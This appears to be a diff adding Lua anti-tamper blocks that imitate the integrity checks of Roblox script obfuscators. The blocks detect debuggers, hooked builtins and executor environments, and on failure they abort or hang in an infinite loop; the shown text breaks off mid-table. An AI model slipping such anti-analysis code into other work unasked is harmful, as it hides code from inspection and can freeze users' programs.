@@ -1,0 +1,2247 @@
+do
+
+
+local _guard = (function()
+	local type = type
+	local pcall = pcall
+	local xpcall = xpcall
+	local error = error
+	local rawget = rawget
+	local rawset = rawset
+	local getmetatable = getmetatable
+	local setmetatable = setmetatable
+	local tostring = tostring
+	local tonumber = tonumber
+	local gmatch = string and string.gmatch
+	local unpack = unpack or (table and table.unpack)
+	local print = print
+	local warn = _G and _G.warn
+	local newproxy = newproxy
+	local debugInfo = debug and debug.info
+	local failed = false
+
+	local function abort()
+		if type(error) == "function" then
+			error("IronBrew1 anti-tamper check failed", 0)
+		end
+
+		return (nil)[1]
+	end
+
+	if
+		type(type) ~= "function"
+		or type(pcall) ~= "function"
+		or type(xpcall) ~= "function"
+		or type(error) ~= "function"
+		or type(rawget) ~= "function"
+		or type(rawset) ~= "function"
+		or type(getmetatable) ~= "function"
+		or type(setmetatable) ~= "function"
+	then
+		abort()
+	end
+
+	local env
+
+	if type(getfenv) == "function" then
+		local ok, value = pcall(getfenv)
+
+		if ok then
+			env = value
+		end
+	end
+
+	if env == nil then
+		env = _G
+	end
+
+	if type(env) ~= "table" or type(print) ~= "function" or (warn ~= nil and type(warn) ~= "function") then
+		failed = true
+	end
+
+	local slot = {}
+	local marker = function() end
+	local writeOk = pcall(rawset, slot, -271823, marker)
+
+	if not writeOk or rawget(slot, -271823) ~= marker then
+		failed = true
+	end
+
+	rawset(slot, -271823, nil)
+
+	if rawget(slot, -271823) ~= nil or pcall(error) then
+		failed = true
+	end
+
+		local function lineProbe() return (nil)[1] end
+
+	if
+		type(debugInfo) == "function"
+		and type(gmatch) == "function"
+		and type(tostring) == "function"
+		and type(tonumber) == "function"
+	then
+		local lineOk, line = pcall(debugInfo, lineProbe, "l")
+		local sourceOk, source = pcall(debugInfo, lineProbe, "s")
+		local errorLine
+		local callOk = xpcall(lineProbe, function(message)
+			for digits in gmatch(tostring(message), ":(%d+):") do
+				errorLine = tonumber(digits)
+			end
+
+			return message
+		end)
+
+		if
+			callOk
+			or not lineOk
+			or type(line) ~= "number"
+			or not sourceOk
+			or type(source) ~= "string"
+			or source == "[C]"
+			or type(errorLine) ~= "number"
+			or line ~= errorLine
+		then
+			failed = true
+		end
+
+		local nativeOk, nativeSource = pcall(debugInfo, error, "s")
+
+		if nativeOk and type(nativeSource) == "string" and nativeSource ~= "[C]" then
+			failed = true
+		end
+	end
+
+	local canaries = {}
+
+	local function tripwire()
+		failed = true
+		abort()
+	end
+
+	if type(newproxy) == "function" then
+		local proxyOk, proxy = pcall(newproxy, true)
+
+		if not proxyOk or proxy == nil then
+			failed = true
+		else
+			local metatableOk, metatable = pcall(getmetatable, proxy)
+
+			if not metatableOk or type(metatable) ~= "table" then
+				failed = true
+			else
+				metatable.__tostring = tripwire
+				metatable.__concat = tripwire
+				metatable.__call = tripwire
+				canaries[#canaries + 1] = proxy
+			end
+		end
+	end
+
+	local function addCanary(lock)
+		local value = {}
+		local metatable = {
+			__metatable = lock,
+			__tostring = tripwire,
+			__concat = tripwire,
+			__iter = tripwire,
+		}
+		local ok, result = pcall(setmetatable, value, metatable)
+
+		if not ok or result ~= value then
+			failed = true
+			return
+		end
+
+		local readOk, visibleMetatable = pcall(getmetatable, value)
+
+		if not readOk or visibleMetatable ~= lock then
+			failed = true
+		end
+
+		canaries[#canaries + 1] = value
+	end
+
+	addCanary("tddxhpfcpi")
+	addCanary("lsphhfstdm")
+	addCanary("vymgglkhqr")
+
+	if type(unpack) == "function" then
+		local ok = pcall(unpack, {}, 0, 64)
+
+		if not ok then
+			failed = true
+		end
+	end
+
+	if type(env) == "table" then
+		if type(print) == "function" and env.print ~= print then
+			failed = true
+		end
+
+		if type(warn) == "function" and env.warn ~= warn then
+			failed = true
+		end
+	end
+
+	if failed then
+		abort()
+	end
+
+	return canaries
+end)()
+end
+
+do
+	local function abort()
+		error("wYnFuscate environment integrity check failed", 0)
+	end
+
+	local function checkRoblox()
+		local env = getfenv and getfenv(0) or nil
+		local gameOk = game ~= nil and type(game) ~= type({})
+		local newInstance = Instance and Instance.new or nil
+		local instanceOk = newInstance ~= nil and type(newInstance) == type(pcall)
+		local isolatedEnv = getfenv ~= nil and env ~= nil and type(env) == type({}) and (_G == nil or env ~= _G)
+
+		if not gameOk or not instanceOk or not isolatedEnv then
+			abort()
+		end
+
+		local getService = game.GetService
+
+		if type(getService) ~= type(pcall) then
+			abort()
+		end
+
+		local ok, players = pcall(getService, game, "Players")
+
+		if not ok or players == nil or type(players) ~= type(game) then
+			abort()
+		end
+	end
+
+	local function readErrorLine(message)
+		if type(message) ~= "string" then
+			return nil
+		end
+
+		local lastLine
+		local cursor = 1
+
+		while cursor <= #message do
+			if string.byte(message, cursor) == 58 then
+				local digitAt = cursor + 1
+				local value = 0
+				local found = false
+				local byte = string.byte(message, digitAt)
+
+				while digitAt <= #message and byte and byte >= 48 and byte <= 57 do
+					value = value * 10 + byte - 48
+					found = true
+					digitAt = digitAt + 1
+					byte = string.byte(message, digitAt)
+				end
+
+				if found and byte == 58 then
+					lastLine = value
+				end
+			end
+
+			cursor = cursor + 1
+		end
+
+		return lastLine
+	end
+
+	local function getLineReader()
+		local info = debug and debug.info or nil
+		local getInfo = debug and debug.getinfo or nil
+
+		if type(info) == "function" then
+			return function(level)
+				if type(level) ~= "number" or level < 1 or level > 5 then
+					return nil
+				end
+
+				return info(level + 1, "l")
+			end
+		end
+
+		if type(getInfo) == "function" then
+			return function(level)
+				if type(level) ~= "number" or level < 1 or level > 5 then
+					return nil
+				end
+
+				local frame = getInfo(level + 1, "l")
+				return frame and frame.currentline or nil
+			end
+		end
+
+		return nil
+	end
+
+	local function makeSeed()
+		local _, message = pcall(function(...)
+			return (...)()
+		end)
+		local line = readErrorLine(message) or 0
+		local readLine = getLineReader()
+
+		if readLine then
+			local stackLine = (function()
+				return readLine(1)
+			end)() or 0
+
+			if stackLine > 0 then
+				line = stackLine
+			end
+		end
+
+		if line <= 0 or line > 49157 then
+			line = 0
+		end
+
+		local lineFlag = line > 0 and 1 or 0
+		local vectorOk, vector = pcall(function()
+			local vectorType = Vector3int16
+			return vectorType and vectorType.new and vectorType.new(1, 2, 3)
+		end)
+		local vectorValue = 0
+		local hasVector = 0
+
+		if vectorOk and vector ~= nil then
+			vectorValue = vector.X * 31 + vector.Y * 17 + vector.Z * 13
+			hasVector = 1
+		end
+
+		local modulus = 2147483647
+		local seed = 1273961148 % modulus
+		seed = (seed * 48271 + lineFlag + 81) % modulus
+		seed = (seed * 48271 + 82) % modulus
+		seed = (seed * 48271 + vectorValue + 81) % modulus
+
+		if seed == 0 then
+			seed = 1
+		end
+
+		return seed, line, vectorValue, hasVector
+	end
+
+	local function checkDebug()
+		local issues = 0
+		local uncertain = 0
+		local passes = 0
+		local badStack = false
+		local debugLib = debug and type(debug) == type({}) and debug or nil
+		local info = debugLib and debugLib.info or nil
+		local traceback = debugLib and debugLib.traceback or nil
+		local stringLib = string and type(string) == type({}) and string or nil
+		local match = stringLib and stringLib.match or nil
+
+		if info and traceback and match then
+			local function checkNative(value)
+				local ok, source = pcall(function()
+					return info(value, "s")
+				end)
+
+				if ok and source == "[C]" then
+					passes = passes + 1
+				else
+					issues = issues + 1
+				end
+			end
+
+			local function checkPattern(text, pattern, expected)
+				local ok, result = pcall(function()
+					return match(text, pattern)
+				end)
+
+				if ok and result == expected then
+					passes = passes + 1
+				else
+					issues = issues + 1
+				end
+			end
+
+			checkNative(info)
+			checkNative(traceback)
+
+			local luaFunction = function()
+				return 1
+			end
+			local lineOk, line = pcall(function()
+				return info(luaFunction, "l")
+			end)
+
+			if lineOk and type(line) == "number" then
+				passes = passes + 1
+			else
+				uncertain = uncertain + 1
+			end
+
+			checkNative(pcall)
+			checkNative(match)
+
+			local rawOk, rawError = pcall(rawget)
+
+			if rawOk then
+				issues = issues + 1
+			elseif type(rawError) == "string" then
+				if match(rawError, "^[^:]+:%d+:") then
+					issues = issues + 1
+				end
+
+				if match(rawError, "missing argument") or match(rawError, "bad argument") then
+					passes = passes + 1
+				else
+					issues = issues + 1
+				end
+			else
+				issues = issues + 1
+			end
+
+			local marker = "rwr8f:153:oesr3c"
+			checkPattern(marker, "^[^:]+:(%d+):", "153")
+			checkPattern("98475:-37:oesr3c", ".*:%s*(%-%d+):%s", "-37")
+			checkPattern("oejn5:oesr3c", "^[^:]+:([a-z0-9]+)$", "oesr3c")
+			checkPattern("oejn5:oesr3c", "^__no_match__$", nil)
+
+			if readErrorLine(marker) == 153 then
+				passes = passes + 1
+			else
+				issues = issues + 1
+				badStack = true
+			end
+
+			if passes >= 5 then
+				local frameOk, source = pcall(function()
+					return info(4, "s")
+				end)
+
+				if frameOk and source == "[C]" then
+					issues = issues + 1
+					badStack = true
+				elseif frameOk and source ~= nil then
+					uncertain = uncertain + 1
+				end
+			end
+
+			local expectedFrames = 11
+			local traceOk, trace = pcall(traceback)
+
+			if traceOk and type(trace) == "string" then
+				local lines = 1
+
+				for cursor = 1, #trace do
+					if string.byte(trace, cursor) == 10 then
+						lines = lines + 1
+					end
+				end
+
+				expectedFrames = lines + 5
+			end
+
+			local countOk, frameCount = pcall(function()
+				local count = 0
+
+				for level = 1, 24 do
+					local ok, source = pcall(function()
+						return info(level, "s")
+					end)
+
+					if not ok or source == nil then
+						break
+					end
+
+					count = count + 1
+				end
+
+				return count
+			end)
+
+			if countOk and type(frameCount) == "number" and frameCount > expectedFrames then
+				issues = issues + 1
+				badStack = true
+			end
+		else
+			issues = issues + 1
+		end
+
+		if info and traceback then
+			local hits = { 0, 0, 0, 0, 0 }
+			local crossHits = 0
+
+			local function sample(wrapper)
+				wrapper(function()
+					local ok3, source3 = pcall(function()
+						return info(3, "s")
+					end)
+					local ok4, source4 = pcall(function()
+						return info(4, "s")
+					end)
+					local ok6, source6 = pcall(function()
+						return info(6, "s")
+					end)
+					local ok8, source8 = pcall(function()
+						return info(8, "s")
+					end)
+					local ok11, source11 = pcall(function()
+						return info(11, "s")
+					end)
+
+					if ok3 and source3 == "[C]" then
+						hits[1] = hits[1] + 1
+					end
+					if ok4 and source4 == "[C]" then
+						hits[2] = hits[2] + 1
+					end
+					if ok6 and source6 == "[C]" then
+						hits[3] = hits[3] + 1
+					end
+					if ok8 and source8 == "[C]" then
+						hits[4] = hits[4] + 1
+					end
+					if ok11 and source11 == "[C]" then
+						hits[5] = hits[5] + 1
+					end
+
+					if ok11 and source11 ~= nil then
+						if ok4 and source4 == "[C]" then
+							crossHits = crossHits + 1
+						end
+						if ok6 and source6 == "[C]" then
+							crossHits = crossHits + 1
+						end
+						if ok8 and source8 == "[C]" then
+							crossHits = crossHits + 1
+						end
+					end
+				end)
+			end
+
+			local function direct(callback)
+				callback()
+			end
+
+			local function nested(callback)
+				local function first()
+					local function second()
+						local function third()
+							callback()
+						end
+
+						third()
+					end
+
+					second()
+				end
+
+				first()
+			end
+
+			local function threaded(callback)
+				local create = coroutine and coroutine.create or nil
+				local resume = coroutine and coroutine.resume or nil
+
+				if create and resume then
+					local thread = create(function()
+						callback()
+					end)
+					resume(thread)
+				else
+					callback()
+				end
+			end
+
+			sample(direct)
+			sample(nested)
+			sample(threaded)
+
+			local repeated = 0
+
+			for index = 1, #hits do
+				if hits[index] >= 2 then
+					repeated = repeated + 1
+				end
+			end
+
+			if repeated >= 1 then
+				issues = issues + 1
+				badStack = true
+			elseif crossHits >= 2 then
+				uncertain = uncertain + 1
+			end
+
+			if repeated * 2 + crossHits > 0 then
+				badStack = true
+			end
+		end
+
+		if badStack or (issues >= 2 and passes >= 4) or (uncertain >= 2 and passes >= 5) then
+			abort()
+		end
+	end
+
+	local function restoreBuiltins()
+		local call = pcall
+		local read = rawget
+		local getGlobalEnv = getgenv
+
+		if not call or not read or not getGlobalEnv then
+			return
+		end
+
+		local ok, env = call(getGlobalEnv)
+
+		if not ok or type(env) ~= "table" then
+			return
+		end
+
+		local restore = read(env, "restorefunction")
+
+		if type(restore) ~= "function" then
+			return
+		end
+
+		local function restoreOne(value)
+			if value then
+				call(restore, value)
+			end
+		end
+
+		restoreOne(string and string.byte)
+		restoreOne(setmetatable)
+		restoreOne(pcall)
+		restoreOne(rawget)
+		restoreOne(rawset)
+		restoreOne(pairs)
+		restoreOne(type)
+		restoreOne(getfenv)
+		restoreOne(setfenv)
+	end
+
+	checkRoblox()
+	checkDebug()
+	restoreBuiltins()
+	makeSeed()
+end
+
+
+		
+do
+    local INVALID_MEMBER = "ndKvWRnSKYzhBhualx_"
+    local TRACE_MARKER = "SIOyDNtDoX"
+    local KEY_SEED = "\215\253Pm\201R\197\183\225rYU\177\157\2477"
+
+    local function fail()
+        error("MoonVeil environment integrity check failed", 0)
+    end
+
+    local function errorContainsInvalidMember(value)
+        if type(value) ~= "string" then
+            fail()
+        end
+
+        return value:find(INVALID_MEMBER, 1, true) ~= nil
+    end
+
+    local function requireNonCallable(value)
+        local ok, result = pcall(function()
+            value()
+        end)
+
+        if ok or errorContainsInvalidMember(result) then
+            fail()
+        end
+    end
+
+    local function probeInvalidMember(value, knownMember, expectedSeedLength, mustFail)
+        local ok, result = pcall(function()
+            if value[knownMember] and #KEY_SEED == expectedSeedLength then
+            end
+
+            if value[INVALID_MEMBER] then
+            end
+        end)
+
+        if ok then
+            if mustFail then
+                fail()
+            end
+            return
+        end
+
+        if not errorContainsInvalidMember(result) then
+            fail()
+        end
+    end
+
+    if game == nil or Enum == nil then
+        fail()
+    end
+
+    requireNonCallable(game)
+    probeInvalidMember(game, "GetService", 16, false)
+    probeInvalidMember(game, "workspace", 16, false)
+
+    requireNonCallable(Enum)
+    probeInvalidMember(Enum, "Font", 32, true)
+    probeInvalidMember(Enum, "Material", 32, false)
+
+    if type(debug) ~= "table"
+        or type(debug.traceback) ~= "function"
+        or type(debug.info) ~= "function"
+    then
+        fail()
+    end
+
+    local traceback = debug.traceback(TRACE_MARKER)
+    if type(traceback) ~= "string" then
+        fail()
+    end
+
+    local firstNewline = traceback:find("\n", 1, true)
+    if firstNewline == nil then
+        fail()
+    end
+
+    local firstTraceLine = traceback:sub(1, firstNewline - 1)
+    local lineIterator = traceback:gmatch(":(%d*)\n")
+    local firstLineNumber = lineIterator()
+    local lineCount = 1
+
+    for lineNumber in lineIterator do
+        local _ = firstLineNumber ~= lineNumber and lineCount < 2
+        lineCount = lineCount + 1
+    end
+
+    local currentLine = debug.info(1, "l")
+    if type(currentLine) ~= "number" and type(currentLine) ~= "string" then
+        fail()
+    end
+
+    local _ = firstTraceLine == TRACE_MARKER
+        and lineCount >= 2
+        and firstLineNumber == "" .. currentLine
+end
+
+		
+do
+    local function detected(reason)
+        while true do
+            reason = reason
+        end
+    end
+
+    local function check(value, reason)
+        if not value then
+            detected(reason)
+        end
+    end
+
+    local function normalizeError(value)
+        if type(value) ~= "string" then
+            return value
+        end
+
+        return (string.gsub(value, " to '[^']+'", ""))
+    end
+
+    local function checkError(ok, actual, expected, reason)
+        check(ok == false, reason .. ":status")
+        check(
+            normalizeError(actual) == normalizeError(expected),
+            reason .. ":error"
+        )
+    end
+
+    local function checkErrorSuffix(
+        ok, actual, expected, reason
+    )
+        check(ok == false, reason .. ":status")
+        local actualText = normalizeError(actual)
+        local expectedText = normalizeError(expected)
+        check(type(actualText) == "string" and
+            string.sub(actualText, -#expectedText) ==
+                expectedText, reason .. ":error")
+    end
+
+    local function runChecks()
+        local refs = {
+            assert = assert,
+            error = error,
+            getmetatable = getmetatable,
+            next = next,
+            pairs = pairs,
+            pcall = pcall,
+            rawequal = rawequal,
+            rawget = rawget,
+            rawset = rawset,
+            select = select,
+            setmetatable = setmetatable,
+            tonumber = tonumber,
+            tostring = tostring,
+            type = type,
+            xpcall = xpcall,
+            stringByte = string.byte,
+            stringChar = string.char,
+            stringSub = string.sub,
+            tableInsert = table.insert,
+            tableRemove = table.remove,
+            mathFloor = math.floor,
+            coroutineResume = coroutine.resume,
+            debugInfo = debug.info,
+            taskSpawn = task.spawn,
+            loadstring = loadstring,
+            instanceNew = Instance.new,
+            typeof = typeof,
+            buffer = buffer,
+            b1 = buffer.create,
+            b2 = buffer.fromstring,
+            b3 = buffer.tostring,
+            b4 = buffer.len,
+            b5 = buffer.readi8,
+            b6 = buffer.readu8,
+            b7 = buffer.readi16,
+            b8 = buffer.readu16,
+            b9 = buffer.readi32,
+            b10 = buffer.readu32,
+            b11 = buffer.readf32,
+            b12 = buffer.readf64,
+            b13 = buffer.readstring,
+            b14 = buffer.writei8,
+            b15 = buffer.writeu8,
+            b16 = buffer.writei16,
+            b17 = buffer.writeu16,
+            b18 = buffer.writei32,
+            b19 = buffer.writeu32,
+            b20 = buffer.writef32,
+            b21 = buffer.writef64,
+            b22 = buffer.writestring,
+            b23 = buffer.copy,
+            b24 = buffer.fill,
+            b25 = buffer.readbits,
+            b26 = buffer.writebits,
+        }
+
+        if type(getfenv) == "function" then
+            local function v1()
+                return v
+            end
+            local ok, env = pcall(getfenv, v1)
+            check(ok and type(env) == "table",
+                1)
+            if type(setfenv) == "function" then
+                local v2 = {}
+                local t15 = setmetatable({ v = v2 }, {
+                    __index = env,
+                })
+                local ok2, v21 = pcall(
+                    setfenv, v1, t15
+                )
+                check(ok2 and v21 == v1,
+                    2)
+                check(v1() == v2,
+                    3)
+                check(pcall(
+                    setfenv, v1, env
+                ), 4)
+            end
+        end
+
+        local s1 = "test"
+        local ok1, s2 = pcall(function()
+            error(s1, 0)
+        end)
+        check(not ok1 and type(s2) == "string" and
+            string.find(s2, s1, 1, true) ~= nil,
+            5)
+        local handled, s4 = xpcall(function()
+            error(s1, 0)
+        end, function(message)
+            return "handled:" .. tostring(message)
+        end)
+        check(not handled and type(s4) == "string" and
+            string.find(s4, "handled:", 1, true) == 1 and
+            string.find(s4, s1, 1, true) ~= nil,
+            6)
+
+        local function f1(...)
+            return select("#", ...), ...
+        end
+        local count, first, second, third = f1("head", nil, "tail")
+        check(count == 3 and first == "head" and second == nil and
+            third == "tail", 7)
+        local function f2()
+            return 17, nil, 29
+        end
+        local returnCount = select("#", f2())
+        local returnFirst, returnSecond, returnThird = f2()
+        check(returnCount == 3 and returnFirst == 17 and
+            returnSecond == nil and returnThird == 29,
+            8)
+
+        local closures = {}
+        for index = 1, 3 do
+            local captured = index
+            closures[index] = function(increment)
+                captured = captured + increment
+                return captured
+            end
+        end
+        check(closures[1](4) == 5 and closures[1](2) == 7 and
+            closures[2](3) == 5 and closures[3](1) == 4,
+            9)
+
+        local writes = {}
+        local metatable = {
+            __index = function(_, key)
+                return "index:" .. tostring(key)
+            end,
+            __newindex = function(_, key, value)
+                writes[key] = value
+            end,
+            __add = function(left, right)
+                return rawget(left, "value") + rawget(right, "value")
+            end,
+            __tostring = function()
+                return "object"
+            end,
+        }
+        local left = setmetatable({ value = 13 }, metatable)
+        local right = setmetatable({ value = 7 }, metatable)
+        check(left.missing == "index:missing",
+            10)
+        left.recorded = 41
+        check(writes.recorded == 41,
+            11)
+        check(left + right == 20,
+            12)
+        check(tostring(left) == "object" and
+            getmetatable(left) == metatable,
+            13)
+        rawset(left, "raw", 53)
+        check(rawget(left, "raw") == 53 and
+            rawequal(left, left) and not rawequal(left, right),
+            14)
+
+        local values = { 4, 1, 3 }
+        table.insert(values, 2, 2)
+        check(table.concat(values, ",") == "4,2,1,3",
+            15)
+        check(table.remove(values, 1) == 4,
+            16)
+        table.sort(values)
+        check(table.concat(values, ",") == "1,2,3",
+            17)
+        local pairCount = 0
+        for key, value in pairs({ alpha = 1, beta = 2 }) do
+            check((key == "alpha" and value == 1) or
+                (key == "beta" and value == 2),
+                18)
+            pairCount = pairCount + 1
+        end
+        check(pairCount == 2,
+            19)
+        local arrayCount = 0
+        for index, value in ipairs({ 3, 5, 7 }) do
+            check(value == index * 2 + 1,
+                20)
+            arrayCount = arrayCount + 1
+        end
+        check(arrayCount == 3,
+            21)
+
+        local binary = "A\0z"
+        check(string.byte(binary, 1) == 65 and
+            string.byte(binary, 2) == 0 and string.byte(binary, 3) == 122,
+            22)
+        check(string.char(65, 0, 122) == binary,
+            23)
+        check(string.sub("abcdef", 2, -2) == "bcde",
+            24)
+        check(string.reverse("abc\0") == "\0cba",
+            25)
+        check(string.rep("xy", 3) == "xyxyxy" and
+            #"a\0b" == 3 and string.format("%02x:%s", 15, "ok") == "0f:ok",
+            26)
+
+        check(tonumber("ff", 16) == 255 and
+            math.floor(-1.25) == -2 and math.abs(-17) == 17 and
+            math.min(9, 3, 7) == 3 and math.max(9, 3, 7) == 9,
+            27)
+        local nan = 0 / 0
+        check(math.huge > 1e308 and nan ~= nan and
+            (-17 % 5) == 3, 28)
+
+        check(type(bit32) == "table",
+            29)
+        check(bit32.bxor(0x55AA55AA, 0x0F0F0F0F) == 0x5AA55AA5 and
+            bit32.band(0x12345678, 0x00FF00FF) == 0x00340078 and
+            bit32.bor(0x12003478, 0x00345600) == 0x12347678 and
+            bit32.lrotate(0x12345678, 8) == 0x34567812 and
+            bit32.rshift(0x80000000, 31) == 1,
+            30)
+
+        local t16 = {
+            { "create", refs.b1 }, { "fromstring", refs.b2 },
+            { "tostring", refs.b3 }, { "len", refs.b4 },
+            { "readi8", refs.b5 }, { "readu8", refs.b6 },
+            { "readi16", refs.b7 }, { "readu16", refs.b8 },
+            { "readi32", refs.b9 }, { "readu32", refs.b10 },
+            { "readf32", refs.b11 }, { "readf64", refs.b12 },
+            { "readstring", refs.b13 }, { "writei8", refs.b14 },
+            { "writeu8", refs.b15 }, { "writei16", refs.b16 },
+            { "writeu16", refs.b17 }, { "writei32", refs.b18 },
+            { "writeu32", refs.b19 }, { "writef32", refs.b20 },
+            { "writef64", refs.b21 }, { "writestring", refs.b22 },
+            { "copy", refs.b23 }, { "fill", refs.b24 },
+            { "readbits", refs.b25 }, { "writebits", refs.b26 },
+        }
+        for i, t in ipairs(t16) do
+            local fn = t[2]
+            local source, line, name, parameters, variadic, v23 =
+                debug.info(fn, "slnaf")
+            check(type(fn) == "function" and source == "[C]" and
+                line == -1 and name == t[1] and parameters == 0 and
+                variadic == true and v23 == fn and
+                iscclosure(fn) == true and islclosure(fn) == false,
+                49 + i)
+        end
+
+        local s5 = string.char(0, 1, 127, 128, 255, 65, 0, 90)
+        local v24 = refs.b2(s5)
+        check(type(v24) == "buffer" and typeof(v24) == "buffer" and
+            refs.b4(v24) == #s5 and refs.b3(v24) == s5, 76)
+
+        local v25 = refs.b1(48)
+        check(type(v25) == "buffer" and refs.b4(v25) == 48 and
+            refs.b3(v25) == string.rep("\0", 48), 77)
+        refs.b14(v25, 0, -128)
+        refs.b15(v25, 1, 255)
+        refs.b16(v25, 2, -12345)
+        refs.b17(v25, 4, 0xFEDC)
+        refs.b18(v25, 6, -123456789)
+        refs.b19(v25, 10, 0xDEADBEEF)
+        refs.b20(v25, 14, 1.25)
+        refs.b21(v25, 18, -1234.5)
+        refs.b22(v25, 26, "A\0z")
+        check(refs.b5(v25, 0) == -128 and refs.b6(v25, 1) == 255 and
+            refs.b7(v25, 2) == -12345 and refs.b8(v25, 4) == 0xFEDC and
+            refs.b9(v25, 6) == -123456789 and
+            refs.b10(v25, 10) == 0xDEADBEEF and
+            refs.b11(v25, 14) == 1.25 and refs.b12(v25, 18) == -1234.5 and
+            refs.b13(v25, 26, 3) == "A\0z", 78)
+
+        local v26 = refs.b1(6)
+        refs.b17(v26, 0, 0x1234)
+        refs.b19(v26, 2, 0x89ABCDEF)
+        check(refs.b3(v26) == string.char(0x34, 0x12, 0xEF, 0xCD, 0xAB, 0x89),
+            79)
+
+        local v27 = refs.b1(8)
+        refs.b24(v27, 0, 0x2E)
+        refs.b23(v27, 1, refs.b2("abcdef"), 2, 3)
+        check(refs.b3(v27) == ".cde....", 80)
+
+        local v28 = refs.b1(4)
+        refs.b26(v28, 3, 5, 0x15)
+        check(refs.b25(v28, 3, 5) == 0x15, 81)
+
+        local ok5, err5 = pcall(refs.b10, v25, 45)
+        local ok6, err6 = pcall(refs.b15, v25, -1, 0)
+        local ok7, err7 = pcall(refs.b13, v25, 47, 2)
+        check(not ok5 and type(err5) == "string" and
+            not ok6 and type(err6) == "string" and
+            not ok7 and type(err7) == "string", 82)
+
+        local thread = coroutine.create(function(value)
+            local resumed = coroutine.yield(value + 1)
+            return resumed + 2
+        end)
+        check(coroutine.status(thread) == "suspended",
+            31)
+        local resumed, yielded = coroutine.resume(thread, 9)
+        check(resumed and yielded == 10 and
+            coroutine.status(thread) == "suspended",
+            32)
+        local completed, result = coroutine.resume(thread, 11)
+        check(completed and result == 13 and
+            coroutine.status(thread) == "dead",
+            33)
+
+        local compiledOk, compiled = pcall(
+            loadstring, "return 19, nil, 23", "Luraph"
+        )
+        check(compiledOk and type(compiled) == "function",
+            34)
+        local compiledFirst, compiledSecond, compiledThird = compiled()
+        check(compiledFirst == 19 and compiledSecond == nil and
+            compiledThird == 23,
+            35)
+        local ok3, v8, err3 = pcall(
+            loadstring, "local =", "Luraph2"
+        )
+        check(ok3 and v8 == nil and
+            type(err3) == "string",
+            36)
+
+        local trace = debug.traceback("trace")
+        check(type(trace) == "string" and
+            string.find(trace, "trace", 1, true) ~= nil,
+            37)
+        local function f3()
+            return true
+        end
+        check(debug.info(f3, "f") == f3 and
+            type(debug.info(f3, "s")) == "string",
+            38)
+
+        local env2 = getfenv(0)
+        local f4 = function(value)
+            return value
+        end
+        local f5 = rawget(env2, "islclosure")
+        local f6 = rawget(env2, "iscclosure")
+        local f7 = rawget(env2, "newcclosure")
+        local f8 = rawget(env2, "clonefunction")
+        local f9 = rawget(env2, "isfunctionhooked")
+        local f10 = rawget(env2, "checkcaller")
+        if type(f5) == "function" then
+            check(f5(f4) == true,
+                39)
+        end
+        if type(f6) == "function" then
+            check(f6(f4) == false,
+                40)
+        end
+        if type(f7) == "function" then
+            local wrapped = f7(f4)
+            check(type(wrapped) == "function" and wrapped(31) == 31,
+                41)
+            if type(f6) == "function" then
+                check(f6(wrapped) == true,
+                    42)
+            end
+        end
+        if type(f8) == "function" then
+            local cloned = f8(pcall)
+            local cloneOk, cloneValue = cloned(function()
+                return 37
+            end)
+            check(type(cloned) == "function" and cloneOk and
+                cloneValue == 37,
+                43)
+        end
+        if type(f9) == "function" then
+            for _, fn in ipairs({
+                refs.assert, refs.error, refs.pcall,
+                refs.stringByte, refs.tableInsert,
+            }) do
+                check(f9(fn) == false,
+                    44)
+            end
+        end
+        if type(f10) == "function" then
+            check(type(f10()) == "boolean",
+                45)
+        end
+
+        check(type(game) == "userdata" and
+            typeof(game) == "Instance" and game.ClassName == "DataModel",
+            46)
+        local service = game:GetService("RunService")
+        check(typeof(service) == "Instance" and
+            service.ClassName == "RunService",
+            47)
+
+        check(assert == refs.assert and error == refs.error and
+            getmetatable == refs.getmetatable and next == refs.next and
+            pairs == refs.pairs and pcall == refs.pcall and
+            rawequal == refs.rawequal and rawget == refs.rawget and
+            rawset == refs.rawset and select == refs.select and
+            setmetatable == refs.setmetatable and tonumber == refs.tonumber and
+            tostring == refs.tostring and type == refs.type and
+            xpcall == refs.xpcall and string.byte == refs.stringByte and
+            string.char == refs.stringChar and string.sub == refs.stringSub and
+            table.insert == refs.tableInsert and table.remove == refs.tableRemove and
+            math.floor == refs.mathFloor and
+            coroutine.resume == refs.coroutineResume and
+            debug.info == refs.debugInfo and task.spawn == refs.taskSpawn and
+            loadstring == refs.loadstring and Instance.new == refs.instanceNew and
+            typeof == refs.typeof and buffer == refs.buffer and
+            buffer.create == refs.b1 and buffer.fromstring == refs.b2 and
+            buffer.tostring == refs.b3 and buffer.len == refs.b4 and
+            buffer.readi8 == refs.b5 and buffer.readu8 == refs.b6 and
+            buffer.readi16 == refs.b7 and buffer.readu16 == refs.b8 and
+            buffer.readi32 == refs.b9 and buffer.readu32 == refs.b10 and
+            buffer.readf32 == refs.b11 and buffer.readf64 == refs.b12 and
+            buffer.readstring == refs.b13 and buffer.writei8 == refs.b14 and
+            buffer.writeu8 == refs.b15 and buffer.writei16 == refs.b16 and
+            buffer.writeu16 == refs.b17 and buffer.writei32 == refs.b18 and
+            buffer.writeu32 == refs.b19 and buffer.writef32 == refs.b20 and
+            buffer.writef64 == refs.b21 and buffer.writestring == refs.b22 and
+            buffer.copy == refs.b23 and buffer.fill == refs.b24 and
+            buffer.readbits == refs.b25 and buffer.writebits == refs.b26,
+            48)
+    end
+
+    local t1 = {
+        { name = "utf8", keys = { "offset", "codepoint", "nfdnormalize", "char", "codes", "len", "graphemes", "nfcnormalize", "charpattern" } },
+        { name = "math", keys = { "log", "e", "ldexp", "deg", "cosh", "round", "random", "frexp", "tanh", "floor", "max", "sqrt", "modf", "huge", "sqrt2", "pow", "isnan", "acos", "phi", "tau", "exp", "pi", "isfinite", "tan", "cos", "isinf", "atan", "map", "sign", "ceil", "clamp", "noise", "abs", "nan", "sinh", "asin", "min", "randomseed", "fmod", "rad", "atan2", "log10", "sin", "lerp" } },
+        { name = "debug", keys = { "dumpheap", "getconstants", "getproto", "setmemorycategory", "profilebegin", "loadmodule", "traceback", "getstack", "getregistry", "setmetatable", "getupvalues", "getupvalue", "getmemorycategory", "resetmemorycategory", "setupvalue", "validlevel", "isvalidlevel", "dumpcodesize", "setstack", "getconstant", "profileend", "info", "getinfo", "getprotos", "setconstant", "getmetatable", "dumprefs" } },
+        { name = "task", keys = { "defer", "cancel", "wait", "desynchronize", "synchronize", "delay", "spawn" } },
+        { name = "script", keys = { "script" } },
+    }
+    local t2 = {
+        utf8 = utf8,
+        math = math,
+        debug = debug,
+        task = task,
+        script = { script = script },
+    }
+    local t3 = {
+        nfdnormalize = true, graphemes = true,
+        nfcnormalize = true, isnan = true,
+        isfinite = true, isinf = true,
+        setmemorycategory = true, profilebegin = true,
+        getmemorycategory = true,
